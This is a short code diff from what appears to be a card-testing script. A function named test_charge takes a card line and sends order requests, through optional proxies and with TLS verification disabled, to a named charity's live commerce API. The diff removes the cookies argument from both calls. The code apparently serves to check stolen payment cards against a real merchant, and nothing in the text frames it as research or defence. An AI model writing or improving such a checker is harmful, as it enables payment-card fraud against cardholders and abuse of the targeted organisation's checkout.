@@ -342,9 +342,9 @@ def test_charge(cc_line):
         }  
 
         if proxy_dict:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
+            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, json=json_data, proxies=proxy_dict, timeout=30, verify=False)
         else:
-            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', cookies=cookies, headers=headers, json=json_data, timeout=30, verify=False)
+            response1 = requests.post('https://www.onamissionkc.org/api/2/commerce/orders', headers=headers, json=json_data, timeout=30, verify=False)
 
         apx1 = response1.json()
         
